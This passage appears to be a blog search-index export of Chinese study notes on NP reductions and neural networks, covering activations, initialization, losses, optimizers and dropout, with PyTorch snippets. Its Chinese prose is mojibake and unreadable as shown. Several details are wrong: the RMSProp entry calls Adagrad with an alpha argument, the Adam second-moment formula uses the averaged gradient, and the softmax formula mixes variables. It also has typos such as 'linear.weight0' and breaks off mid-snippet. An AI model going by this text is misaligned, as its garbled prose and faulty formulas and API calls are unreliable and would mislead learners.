å¿…é¡»ä¸ºå¤šé¡¹å¼æ—¶é—´ è¾“å‡ºä¸€è‡´æ€§ï¼šå½’çº¦åçš„è¾“å‡ºå’ŒåŸæ¥çš„è¾“å‡ºä¸€è‡´ï¼Œå³ï¼Œå¦‚ $ algo_1 $ æ˜¯ $ Q_1 $ çš„ç®—æ³•ï¼Œ $ algo_2 $ æ˜¯ $ Q_2 $ çš„ç®—æ³•ï¼Œåˆ™åœ¨ç›¸åŒçš„è¾“å…¥ä¸‹ï¼Œ $ algo_1(Q_1)=algo_2(Q_2) $ å½’çº¦çš„ä¼ é€’æ€§ï¼šå¦‚æœé—®é¢˜ $\\mathcal{A}$ å¯å½’çº¦ä¸ºé—®é¢˜ $\\mathcal{B}$ ï¼Œé—®é¢˜Bå¯å½’çº¦ä¸ºé—®é¢˜ $\\mathcal{C}$ ï¼Œåˆ™é—®é¢˜ $\\mathcal{A}$ å¯å½’çº¦ä¸ºé—®é¢˜ $\\mathcal{C}$ ","date":"2025-12-06T15:19:03+08:00","permalink":"http://localhost:1313/p/np%E9%97%AE%E9%A2%98%E4%B8%8E%E5%BD%92%E7%BA%A6/","title":"NPé—®é¢˜ä¸å½’çº¦"},{"content":" ç›®å½• å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰ ç¥ç»å…ƒ ç¥ç»ç½‘ç»œç»“æ„ ç¥ç»ç½‘ç»œç»“æ„æ¨¡å‹æ­å»º æŸå¤±å‡½æ•° äºŒåˆ†ç±»ä»»åŠ¡â€”â€”äºŒå…ƒäº¤å‰ç†µæŸå¤±ï¼ˆSigmoidæŸå¤±ï¼‰ å¤šåˆ†ç±»ä»»åŠ¡â€”â€”å¤šå…ƒäº¤å‰ç†µæŸå¤±ï¼ˆSoftmaxæŸå¤±ï¼‰ å›å½’æŸå¤±â€”â€”MAEæŸå¤±å‡½æ•°ï¼ˆL1èŒƒæ•°/æ›¼å“ˆé¡¿è·ç¦»ï¼‰ å›å½’æŸå¤±â€”â€”MSEæŸå¤±å‡½æ•°ï¼ˆL2èŒƒæ•°/æ¬§æ°è·ç¦»ï¼‰ å›å½’æŸå¤±â€”â€”Smooth L1æŸå¤±å‡½æ•°ï¼ˆL1ä¸L2çš„ç»“ï¼‰ åå‘ä¼ æ’­ä¸æ¢¯åº¦ä¸‹é™ åå‘ä¼ æ’­ æ¢¯åº¦ä¸‹é™ æ­£åˆ™åŒ– Dropoutæ­£åˆ™åŒ– BNå±‚ï¼ˆå°æ‰¹é‡å½’ä¸€åŒ–ï¼‰ å®è·µâ€”â€”æ‰‹æœºä»·æ ¼åˆ†ç±»é¢„æµ‹ å¯¼å…¥å·¥å…·åŒ… æ•°æ®åŠ è½½ æ„å»ºæ¨¡å‹ æ¨¡å‹è®­ç»ƒ æ¨¡å‹è¯„ä¼° ç¨‹åºå…¥å£ å®è·µï¼ˆæ”¹è¿›ï¼‰â€”â€”æ‰‹æœºä»·æ ¼åˆ†ç±»é¢„æµ‹ å·¥å…·å¯¼å…¥ æ•°æ®åŠ è½½ æ¨¡å‹æ„å»º æ¨¡å‹è®­ç»ƒ æ¨¡å‹è¯„ä¼° å‡½æ•°å…¥å£ å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰ å›¾åƒåŸºç¡€ å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ å·ç§¯å±‚ï¼šç‰¹å¾æå– æ± åŒ–å±‚ å®è·µ â€”â€” CCNå®ç°å›¾ç‰‡åˆ†ç±» å¯¼å…¥å·¥å…· æ•°æ®å¯¼å…¥ æ¨¡å‹æ„å»º æ¨¡å‹è®­ç»ƒ æ¨¡å‹è¯„ä¼° ç¨‹åºå…¥å£ å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰ è‡ªç„¶è¯­è¨€å¤„ç†åŸºç¡€ æ–‡æœ¬å¤„ç†ä¸RNNç½‘ç»œ è¯åµŒå…¥å±‚ RNN è¯è¡¨ç”Ÿæˆ ç¥ç»ç½‘ç»œï¼ˆNeural Networkï¼ŒNNï¼‰ å‰é¦ˆç¥ç»ç½‘ç»œï¼ˆFNNï¼‰ ç¥ç»å…ƒ æ•°å­¦æ¨¡å‹ï¼š$$output = f(b+\\displaystyle{\\sum_{i=1}^nx_iw_i})$$ï¼Œå…¶ä¸­ $f(x)$ ä¸ºéçº¿æ€§çš„æ¿€æ´»å‡½æ•°ï¼ˆActivation Functionï¼‰; $n$ ä¸ºè¾“å…¥æ ·æœ¬çš„ç‰¹å¾æ•°é‡ æ¿€æ´»å‡½æ•° Sigmoid: $$f(x) = \\displaystyle{\\frac{1}{1+e^{-x}}}$$ ä¼˜ç‚¹ï¼šå¯å¾®ã€æœ‰ç•Œã€å•è°ƒã€ç›´è§‚ ç¼ºç‚¹ï¼šæ¢¯åº¦æ¶ˆå¤±ã€æ’ä¸ºæ­£ã€é¥±å’ŒåŒº Tanhï¼š $$\\displaystyle{f(x)=\\frac{1-e^{-2x}}{1+e^{-2x}}}$$ ä¼˜ç‚¹ï¼šé›¶å‡å€¼ã€å¯¼æ•°å¹…åº¦å¤§ã€å¯å¾® ç¼ºç‚¹ï¼šæ¢¯åº¦æ¶ˆå¤±ã€é¥±å’ŒåŒº ReLUï¼š $$f(x)=\\max(0,x)$$ ä¼˜ç‚¹ï¼šæ— æ¢¯åº¦æ¶ˆå¤±ã€è®¡ç®—æç®€ã€ç¨€ç–æ¿€æ´»ã€æ”¶æ•›æ›´å¿«ã€æ— ç•Œè¾“å‡º ç¼ºç‚¹ï¼šç¥ç»å…ƒæ°¸ä¹…å…³é—­ã€é0å¯¹ç§°ã€ä¸å¯å¾®ç‚¹0ã€å¯¹å™ªå£°æ•æ„Ÿ ReLUæ‰©å±•ï¼š PReLUï¼š $$ f(x;\\alpha) = \\begin{cases} \\alpha x,\\ \u0026x\u003c0 \\\\ \\ x, \u0026x \\ge 0 \\end{cases} $$ ELU: $$ f(x;\\alpha) = \\begin{cases} \\alpha(e^x-1),\\ \u0026x\u003c0 \\\\ \\ x, \u0026x \\ge 0 \\end{cases} $$ Softmaxï¼š $f_i(x) = \\displaystyle{\\frac{e^{x_i}}{\\sum_{j=1}^ke^{z_j}}}$ Sigmoidå¸¸ç”¨äºäºŒåˆ†ç±»ä»»åŠ¡çš„å•è¾“å‡ºç»“ç‚¹ï¼Œä»£è¡¨æ¦‚ç‡ Softmaxå¸¸ç”¨äºå¤šåˆ†ç±»ä»»åŠ¡çš„kä¸ªè¾“å‡ºèŠ‚ç‚¹ï¼Œä»£è¡¨æ¦‚ç‡ æ±‚å¯¼ï¼š$$\\displaystyle{\\frac{\\partial Out(w)}{\\partial w}=\\frac{\\partial Out(w)}{\\partial In(w)}\\frac{\\partial In(w)}{\\partial w} = \\frac{d f(In)}{d In}\\frac{\\partial In(w)}{\\partial w}}$$ å›¾ç¤ºï¼š ç¥ç»ç½‘ç»œç»“æ„ MLPç»“æ„ï¼šï¼ˆç¥ç»å…ƒä¸²è”ï¼‰ è¾“å…¥å±‚ï¼ˆInput Layerï¼‰ è¾“å…¥å±‚å…±æœ‰nä¸ªç»“ç‚¹ï¼ˆnä¸ºç‰¹å¾æ•°ï¼‰ æ¯ä¸ªè¾“å…¥ç»“ç‚¹ä¸ºæ‰€æœ‰æ ·æœ¬çš„æŸä¸€ä¸ªç‰¹å¾å€¼ï¼Œmè¡Œ1åˆ—ï¼ˆmä¸ºæ ·æœ¬æ•°ï¼‰ éšè—å±‚ï¼ˆHidden Layerï¼‰ MLPä¸­ç¥ç»å…ƒä¹‹é—´ä¸ºå…¨è¿æ¥ æ¯ä¸ªè¿æ¥éƒ½æœ‰ä¸€ä¸ªæƒé‡å€¼ è¾“å‡ºå±‚ï¼ˆOutput Layerï¼‰ è¶…å‚æ•° éšè—å±‚çš„å±‚æ•° æ¯ä¸ªéšè—å±‚çš„ç¥ç»å…ƒä¸ªæ•° å‚æ•°åˆå§‹åŒ– å‡åŒ€åˆ†å¸ƒåˆå§‹åŒ–å‚æ•°ï¼šä» $$\\displaystyle{(-\\frac{1}{\\sqrt d},\\frac{1}{\\sqrt{d}})}$$ï¼Œå…¶ä¸­ d ä¸ºæ¯ä¸ªç¥ç»å…ƒçš„è¾“å…¥æ•°é‡ 1 nn.init.uniform_(linear.weight) æ­£æ€åˆ†å¸ƒåˆå§‹åŒ–å‚æ•°ï¼šä»æ ‡å‡†æ­£æ€éšæœºå–å€¼ 1 nn.init.normal_(linear.weight, mean=0, std=1) å…¨0åˆå§‹åŒ–å‚æ•° 1 nn.init.zeros_(linear.weight0) å…¨1åˆå§‹åŒ–å‚æ•° 1 nn.init.ones_(linear.weight0) å›ºå®šå€¼åˆå§‹åŒ–å‚æ•° KaiMingåˆå§‹åŒ–ï¼ˆHEåˆå§‹åŒ–ï¼‰ æ­£æ€HEåˆå§‹åŒ–ï¼š $$\\displaystyle{\\mathcal{N}\\left(0,\\sqrt{\\frac{2}{in\\_dim}}\\right)}$$ 1 nn.init.kaiming_normal_(linear.weight) å‡åŒ€åˆ†å¸ƒHEåˆå§‹åŒ–ï¼š$$\\displaystyle{\\mathcal{U}\\left(-\\sqrt{\\frac{6}{in_dim}},+\\sqrt{\\frac{6}{in_dim}}\\right)}$$ 1 nn.init.kaiming_uniform_(linear.weight) Xavieråˆå§‹åŒ–ï¼ˆGlorotåˆå§‹åŒ–ï¼‰ æ­£æ€Glorotåˆå§‹åŒ–ï¼ˆé»˜è®¤ï¼‰ï¼š $$\\displaystyle{\\mathcal{N}\\left(0,\\sqrt{\\frac{2}{in\\_dim+out\\_dim}}\\right)}$$ 1 nn.init.xavier_normal_(linear.weight) å‡åŒ€Glorotåˆå§‹åŒ–ï¼š $$\\displaystyle{\\mathcal{U}\\left(-\\sqrt{\\frac{6}{in_dim+out_dim}},+\\sqrt{\\frac{6}{in_dim+out_dim}}\\right)}$$ 1 nn.init.xavier_uniform_(linear.weight) åå‘ä¼ æ’­ï¼šé“¾å¼æ±‚å¯¼ï¼šLosså‡½æ•°å¯¹æ‰€æœ‰å‚æ•°æ±‚å¯¼ å›¾ç¤ºï¼šï¼ˆæ„å»ºå¦‚ä¸‹ï¼‰ åœ¨çº¿å¯è§†åŒ–ç¥ç»ç½‘ç»œï¼šNeural Network Playground ç¥ç»ç½‘ç»œç»“æ„æ¨¡å‹æ­å»º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import torch import torch.nn as nn from torchviz import make_dot from torchsummary import summary class Model(nn.Module): def __init__(self): super(Model,self).__init__() # è°ƒç”¨çˆ¶ç±»åˆå§‹åŒ–æ–¹æ³• self.in_h1_linear = nn.Linear(4,5) # è¾“å…¥å±‚åˆ°ç¬¬ä¸€éšè—å±‚ # nn.init.xavier_normal_(self.in_h1_linear.weight) # åˆå§‹åŒ–æ–¹æ³•ï¼Œä¸ç”¨å†™ self.h1_h2_linear = nn.Linear(5,4) # ç¬¬ä¸€éšè—å±‚åˆ°ç¬¬äºŒéšè—å±‚ # nn.init.kaiming_normal_(self.h1_h2_linear.weight) self.h2_out_linear = nn.Linear(4,3) # ç¬¬äºŒéšè—å±‚åˆ°è¾“å‡ºå±‚ # nn.init.normal_(self.h2_out_linear.weight) def forward(self,x): x = self.in_h1_linear(x) # åˆ°è¾¾ç¬¬ä¸€éšè—å±‚ x = torch.sigmoid(x) # Sigmoidæ¿€æ´»å‡½æ•° x = self.h1_h2_linear(x) # åˆ°è¾¾ç¬¬äºŒéšè—å±‚ x = torch.relu(x) # ReLUæ¿€æ´»å‡½æ•° x = self.h2_out_linear(x) # åˆ°è¾¾è¾“å‡ºå±‚ return torch.softmax(x,dim=-1) # åœ¨è¾“å‡ºå±‚é€šè¿‡Softmaxæ¦‚ç‡åŒ–è¾“å‡ºï¼ˆå¦‚æœæ˜¯å¤šåˆ†ç±»ä»»åŠ¡ï¼‰ if __name__==\u0026#34;__main__\u0026#34;: # å®šä¹‰æ¨¡å‹ model = Model() # å‚æ•°é‡ç»Ÿè®¡ summary(model,input_size=(4,),batch_size=520,device=\u0026#39;cpu\u0026#39;) # å‚æ•°æ‰“å° for name,params in model.named_parameters(): print(name,params) # è®¡ç®—å›¾ç»˜åˆ¶ # y = model(torch.tensor([1,2,3,4],dtype=torch.float32)) # dot = make_dot(y,params=dict(model.named_parameters())) # print(dot) ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [520, 5] 25 Linear-2 [520, 4] 24 Linear-3 [520, 3] 15 ================================================================ Total params: 64 Trainable params: 64 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.01 Forward/backward pass size (MB): 0.05 Params size (MB): 0.00 Estimated Total Size (MB): 0.06 ---------------------------------------------------------------- in_h1_linear.weight Parameter containing: tensor([[-0.1587, -0.1239, 0.4235, 0.3390], [-0.0211, -0.4489, -0.0343, -0.0293], [ 0.4945, 0.1847, -0.2413, -0.1682], [-0.0767, -0.0808, -0.0054, 0.4703], [ 0.4768, 0.4413, -0.2241, -0.2929]], requires_grad=True) in_h1_linear.bias Parameter containing: tensor([ 0.3772, 0.1606, -0.4499, 0.3997, -0.2885], requires_grad=True) h1_h2_linear.weight Parameter containing: tensor([[ 0.3114, 0.1786, -0.2437, 0.1051, -0.3297], [ 0.2338, 0.4141, 0.3638, -0.1816, 0.1560], [-0.1107, -0.1953, -0.0770, -0.0711, -0.1429], [-0.3616, -0.2039, -0.3213, -0.0980, -0.3732]], requires_grad=True) h1_h2_linear.bias Parameter containing: tensor([0.0112, 0.3500, 0.1824, 0.0403], requires_grad=True) h2_out_linear.weight Parameter containing: tensor([[ 0.4316, -0.1131, -0.4884, -0.1070], [-0.4599, -0.1800, -0.4684, -0.0996], [-0.3372, -0.1655, -0.3222, 0.2816]], requires_grad=True) h2_out_linear.bias Parameter containing: tensor([0.3777, 0.2212, 0.3185], requires_grad=True) æŸå¤±å‡½æ•° äºŒåˆ†ç±»ä»»åŠ¡â€”â€”äºŒå…ƒäº¤å‰ç†µæŸå¤±ï¼ˆSigmoidæŸå¤±ï¼‰ æŸå¤±å‡½æ•°ï¼š $$\\displaystyle{\\mathcal{L}=-y\\log \\hat y - (1-y)\\log(1-\\hat y)}$$ $ y_i $ï¼ˆé‡‡ç”¨ $One-Hot$ ç¼–ç ï¼‰æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„çœŸå®æ ‡ç­¾ï¼ˆå…± $ m $ æ¡æ ·æœ¬ï¼‰ $\\hat{y}$ æ˜¯æ¨¡å‹é¢„æµ‹å€¼ $\\hat{y} = \\sigma(f_\\theta(x_i))$ $ \\sigma(Â·) $ æ˜¯ $ Sigmoid $ å‡½æ•°ï¼Œå°†æ¨¡å‹è¾“å‡ºè½¬æ¢ä¸ºæ¦‚ç‡ $ \\mathcal{L} $ ç”¨æ¥è¡¡é‡çœŸå®å€¼ $ y $ ä¸é¢„æµ‹å€¼ $ f_\\theta(x) $ ä¹‹é—´çš„å·®å¼‚æ€§æŸå¤± Pytorch: torch.nn.BCELoss() å¤šåˆ†ç±»ä»»åŠ¡â€”â€”å¤šå…ƒäº¤å‰ç†µæŸå¤±ï¼ˆSoftmaxæŸå¤±ï¼‰ æŸå¤±å‡½æ•°ï¼š$$\\mathcal{L} = \\displaystyle{-\\sum_{i=1}^my_i\\log(\\operatorname{S}(f_\\theta(x_i)))}$$ $ y_i $ï¼ˆé‡‡ç”¨ $One-Hot$ ç¼–ç ï¼‰æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„çœŸå®æ ‡ç­¾ï¼ˆå…± $ m $ æ¡æ ·æœ¬ï¼‰ $ f_\\theta(x_i) $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„é¢„æµ‹å€¼ $S(Â·)$ æ˜¯ $Softmax$ æ¿€æ´»å‡½æ•°ï¼Œå°† $x_i$ çš„é¢„æµ‹å€¼è¿›è¡Œæ¦‚ç‡åŒ–ï¼Œè¾“å‡º $x_i$ å¯¹åº”æ¯ä¸ªç±»åˆ«çš„æ¦‚ç‡ $ \\mathcal{L} $ ç”¨æ¥è¡¡é‡çœŸå®å€¼ $ y $ ä¸é¢„æµ‹å€¼ $ f_\\theta(x) $ ä¹‹é—´çš„å·®å¼‚æ€§æŸå¤± Pytorch: torch.nn.CrossEntropyLoss() å›å½’æŸå¤±â€”â€”MAEæŸå¤±å‡½æ•°ï¼ˆL1èŒƒæ•°/æ›¼å“ˆé¡¿è·ç¦»ï¼‰ æŸå¤±å‡½æ•°ï¼š $$\\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m|y_i-f_\\theta(x_i)|}$$ $ y_i $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„çœŸå®å€¼ï¼ˆå…± $ m $ æ¡æ ·æœ¬ï¼‰ $ f_\\theta(x_i) $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„é¢„æµ‹å€¼ Pytorchï¼š torch.nn.L1Loss() å›å½’æŸå¤±â€”â€”MSEæŸå¤±å‡½æ•°ï¼ˆL2èŒƒæ•°/æ¬§æ°è·ç¦»ï¼‰ æŸå¤±å‡½æ•°ï¼š $$\\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m(y_i-f_\\theta(x_i))^2}$$ $ y_i $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„çœŸå®å€¼ï¼ˆå…± $ m $ æ¡æ ·æœ¬ï¼‰ $ f_\\theta(x_i) $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„é¢„æµ‹å€¼ L2 Lossä¹Ÿå¸¸ä½œä¸ºæ­£åˆ™é¡¹ã€‚å½“é¢„æµ‹å€¼ä¸ç›®æ ‡å€¼ç›¸å·®å¾ˆå¤§æ—¶å®¹æ˜“å‘ç”Ÿæ¢¯åº¦çˆ†ç‚¸ Pytorchï¼š torch.nn.MSELoss() å›å½’æŸå¤±â€”â€”Smooth L1æŸå¤±å‡½æ•°ï¼ˆL1ä¸L2çš„ç»“ï¼‰ æŸå¤±å‡½æ•°ï¼š $$ \\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m} \\left[ \\begin{cases} \\displaystyle{\\frac{1}{2}(y_i-f_\\theta(x_i))^2},\\ \u0026 |y_i-f_\\theta(x_i)|\u003c1 \\\\ \\displaystyle{|y_i-f_\\theta(x_i)|-\\frac{1}{2}}, \u0026 otherwise \\end{cases} \\right] $$ $ y_i $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„çœŸå®å€¼ï¼ˆå…± $ m $ æ¡æ ·æœ¬ï¼‰ $ f_\\theta(x_i) $ æ˜¯ç¬¬ $ i $ æ¡æ ·æœ¬ $ x_i $ å¯¹åº”çš„é¢„æµ‹å€¼ çœŸå®å€¼ä¸é¢„æµ‹å€¼å·®å€¼åœ¨ $[-1,1]$ åŒºé—´å†…å®é™…ä¸Šä¸ºL2æŸå¤±ï¼Œè§£å†³äº†L1çš„ä¸å…‰æ»‘é—®é¢˜ çœŸå®å€¼ä¸é¢„æµ‹å€¼å·®å€¼åœ¨ $[-1,1]$ åŒºé—´å¤–å®é™…ä¸Šä¸ºL1æŸå¤±ï¼Œè§£å†³äº†L2æ¢¯åº¦çˆ†ç‚¸é—®é¢˜ Pytorch: torch.nn.SmoothL1Loss() åå‘ä¼ æ’­ä¸æ¢¯åº¦ä¸‹é™ åå‘ä¼ æ’­ å‰å‘ä¼ æ’­ï¼ˆè®¡ç®—è¾“å‡ºï¼‰ï¼š $$\\displaystyle{Out = h(g(f(x_1w_1+Other_1)w_2+Other_2)w_3+Other_3)}$$ åå‘ä¼ æ’­ï¼ˆé“¾å¼æ±‚å¯¼ï¼‰ï¼š $$\\displaystyle{\\frac{\\partial \\mathcal{Loss}}{\\partial w_1} = \\frac{\\partial \\mathcal{Loss}}{\\partial Out}Â·\\frac{\\partial Out}{\\partial M_3}Â·\\frac{\\partial M_3}{\\partial O_2}Â·\\frac{\\partial O_2}{\\partial M_2}Â·\\frac{\\partial M_2}{\\partial O_1}Â·\\frac{\\partial O_1}{\\partial M_1}Â·\\frac{\\partial M_1}{\\partial w_1}}$$ $$\\Rightarrow\\displaystyle{\\nabla_{w_1} \\mathcal{Loss} = { \\mathcal{L}}'_{\\hat y}Â·h'_{M_3}Â·w_3Â·g'_{M_2}Â·w_2Â·f'_{M_1}Â·x_1}$$ å‚æ•°è¿­ä»£ï¼ˆæ¢¯åº¦ä¸‹é™ï¼‰ï¼š $$\\displaystyle{w_1^{new} = w_1^{old}-\\etaÂ·\\nabla_{w_1} \\mathcal{Loss}}$$ æ³¨æ„ï¼šå…¨ä½“å‚æ•°åŒæ—¶æ›´æ–°ï¼Œæ— å…ˆåé¡ºåºã€‚å› æ­¤åœ¨è®¡ç®— $$\\displaystyle{\\nabla_{w_1} \\mathcal{Loss}}$$ æ—¶ç”¨åˆ°çš„ $w_3$ å’Œ $w_2$ ï¼Œä¸º $w_3^{old}$ å’Œ $w_2^{old}$ æ¢¯åº¦ä¸‹é™ è¿­ä»£å‡½æ•°ï¼š $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\etaÂ·\\frac{\\partial\\mathcal{L}}{\\partial w_{ij}}}$$ æ¢¯åº¦ä¸‹é™æ–¹å¼ï¼šå…¨æ¢¯åº¦ï¼ˆBGDï¼‰ã€éšæœºæ¢¯åº¦ï¼ˆSGDï¼‰ã€å°æ‰¹é‡æ¢¯åº¦ï¼ˆMini-Batch SGDï¼Œæ·±åº¦å­¦ä¹ ç”¨ï¼‰ ä¼ ç»Ÿæ¢¯åº¦ä¸‹é™å­˜åœ¨çš„é—®é¢˜ é—®é¢˜ä¸€ï¼šå¹³å¦åŒºåŸŸæ¢¯åº¦ä¸‹é™ç¼“æ…¢ æ¢¯åº¦ä¸‹é™ç®—æ³•ä¼˜åŒ– åŠ¨é‡ç®—æ³•ï¼ˆMomentumï¼‰â€”â€” åŸºäºæŒ‡æ•°åŠ æƒå¹³å‡ è®¾ç¬¬ $ k $ æ¬¡è¿­ä»£æ—¶çš„æ¢¯åº¦ä¸º $ \\mathcal{G}_k $ï¼ŒæŒ‡æ•°åŠ æƒå¹³å‡æ¢¯åº¦ä¸º$ \\mathcal{E}_k $ï¼Œ$ k \\in {1,2\\dots K}$ï¼Œ $\\beta$ ä¸ºæƒé‡ç³»æ•°ï¼ˆé€šå¸¸è®¾ä¸º0.9ï¼‰ã€‚æœ‰ï¼š $$ \\mathcal{E}_k = \\begin{cases} \\mathcal{G}_1,\\ \u0026 k=1 \\\\ \\betaÂ·\\mathcal{E}_{k-1} + (1-\\beta)Â·\\mathcal{G}_k,\u0026 k \\ge 2 \\end{cases} $$ å‚æ•°è¿­ä»£ï¼š $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\etaÂ·\\mathcal{E}_k}$$ Pytorchï¼š torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) AdaGradç®—æ³• åˆå§‹åŒ–å­¦ä¹ ç‡ $\\alpha_0$ ã€å°å¸¸æ•° $\\sigma=1e-6$ ã€ æ¢¯åº¦ç´¯ç§¯å˜é‡ $s_0=0$ è¿­ä»£æµç¨‹ï¼ˆç¬¬ $k$ è½®è¿­ä»£ï¼‰ï¼š ä»è®­ç»ƒé›†ä¸­é‡‡æ · $n$ ä¸ªæ ·æœ¬çš„å°æ‰¹é‡ï¼Œè®¡ç®—æ¢¯åº¦ $\\mathcal{G}_k$ ç´¯è®¡å¹³æ–¹æ¢¯åº¦ $$s_k=s_{k-1}+\\mathcal{G}_k\\odot \\mathcal{G}_k$$ï¼Œ$\\odot$ ä¸ºé€å…ƒç´ ç›¸ä¹˜ å­¦ä¹ ç‡è¿­ä»£ï¼š $$\\displaystyle{\\alpha_{k}=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ å‚æ•°è¿­ä»£ï¼š $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}Â·\\mathcal{G}_k}$$ Pytorchï¼š torch.optim.Adagrad(model.parameters(),lr=0.01) RMSPropç®—æ³• â€”â€” å¯¹AdaGradç®—æ³•çš„ä¼˜åŒ– åˆå§‹åŒ–å­¦ä¹ ç‡ $\\alpha_0$ ã€å°å¸¸æ•° $\\sigma=1e-6$ ã€ æ¢¯åº¦ç´¯ç§¯å˜é‡ $s_0=0$ è¿­ä»£æµç¨‹ï¼ˆç¬¬ $k$ è½®è¿­ä»£ï¼‰ï¼š ä»è®­ç»ƒé›†ä¸­é‡‡æ · $n$ ä¸ªæ ·æœ¬çš„å°æ‰¹é‡ï¼Œè®¡ç®—æ¢¯åº¦ $\\mathcal{G}_k$ ç´¯è®¡æŒ‡æ•°åŠ æƒå¹³å‡å¹³æ–¹æ¢¯åº¦ $$s_k=\\betaÂ·s_{k-1}+(1-\\beta)Â·\\mathcal{G}_k\\odot \\mathcal{G}_k$$ å­¦ä¹ ç‡è¿­ä»£ï¼š $$\\displaystyle{\\alpha_k=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ å‚æ•°è¿­ä»£ï¼š $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}Â·\\mathcal{G}_k}$$ Pytorchï¼š torch.optim.Adagrad(model.parameters(),lr=0.01,alpha=0.9) Adamç®—æ³• â€”â€” Momentumç®—æ³•+RMSPropç®—æ³• åˆå§‹åŒ–å­¦ä¹ ç‡ $\\alpha_0$ ã€å°å¸¸æ•° $\\sigma=1e-6$ ã€ æ¢¯åº¦ç´¯ç§¯å˜é‡ $s_0=0$ è¿­ä»£æµç¨‹ï¼ˆç¬¬ $k$ è½®è¿­ä»£ï¼‰ï¼š ä»è®­ç»ƒé›†ä¸­é‡‡æ · $n$ ä¸ªæ ·æœ¬çš„å°æ‰¹é‡ï¼Œè®¡ç®—æ¢¯åº¦ $\\mathcal{G}_k$ è®¡ç®—æŒ‡æ•°åŠ æƒå¹³å‡æ¢¯åº¦ä¸º$ \\mathcal{E}_k $ï¼š$$ \\mathcal{E}_k = \\begin{cases} \\mathcal{G}_1,\\ \u0026 k=1 \\\\ \\beta_1Â·\\mathcal{E}_{k-1} + (1-\\beta_1)Â·\\mathcal{G}_k,\u0026 k \\ge 2 \\end{cases} $$ ç´¯è®¡æŒ‡æ•°åŠ æƒå¹³å‡å¹³æ–¹æ¢¯åº¦ $$s_k=\\beta_2Â·s_{k-1}+(1-\\beta_2)Â·\\mathcal{E}_k\\odot \\mathcal{E}_k$$ å­¦ä¹ ç‡è¿­ä»£ï¼š $$\\displaystyle{\\alpha_k=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ å‚æ•°è¿­ä»£ï¼š $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}Â·\\mathcal{E}_k}$$ Pytorchï¼š torch.optim.Adam(model.parameters(),lr=0.01,betas=[0.9,0.99]) å­¦ä¹ ç‡è°ƒæ•´ç­–ç•¥ ç­‰é—´éš”å­¦ä¹ ç‡è¡°å‡ç­–ç•¥ï¼š æ¯éš” step_size è½®ï¼Œ lr è¡°å‡è‡³ lr*gamma 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.StepLR(optimizer,step_size=50,gamma=0.5) #......è¿­ä»£è¿‡ç¨‹ï¼š optimizer.step() decelerator.step() æŒ‡å®šé—´éš”å­¦ä¹ ç‡è¡°å‡ï¼šæŒ‡å®šè½®æ¬¡[50,125,160] æ¯åˆ°æŒ‡å®š momentum è½®ï¼Œ lr è¡°å‡è‡³ lr*gamma 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.MultiStepLR(optimizer,milestones=[50,125,160],gamma=0.5) #......è¿­ä»£è¿‡ç¨‹ï¼š optimizer.step() decelerator.step() æŒ‡æ•°å­¦ä¹ ç‡è¡°å‡ æ¯æ¬¡è¿­ä»£ lr è¡°å‡è‡³ lr*(gamma**epoch) 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.ExponentialLR(optimizer,gamma=0.9) #......è¿­ä»£è¿‡ç¨‹ï¼š optimizer.step() decelerator.step() æ­£åˆ™åŒ– æ­£åˆ™åŒ–ç›®çš„ï¼šæé«˜æ¨¡å‹æ³›åŒ–èƒ½åŠ›ï¼Œç¼“è§£è¿‡æ‹Ÿåˆã€‚æœºå™¨å­¦ä¹ ä¸­å¸¸ç”¨L1/L2èŒƒæ•° Dropoutæ­£åˆ™åŒ– æ­£åˆ™åŒ–æ€æƒ³ï¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œè®©éšè—å±‚ç¥ç»å…ƒä»¥è¶…å‚æ•° $p$ çš„æ¦‚ç‡åœæ­¢å·¥ä½œæˆ–è€…æ¿€æ´»å‡½æ•°è¾“å‡ºç½®$0$ï¼Œæœªè¢«ç½®$0$çš„ç¥ç»å…ƒæ”¾å¤§è‡³ $\\displaystyle{\\frac{1}{(1-p)}}$ å€ Pytorchï¼šåœ¨forwardæ–¹æ³•ä¸­ï¼š 1 2 3 4 # layer = nn.Linear(4,5) # dropout = nn.Dropout(p=0.4) # å¤±æ´»æ¦‚ç‡0.4 M = layer(input) 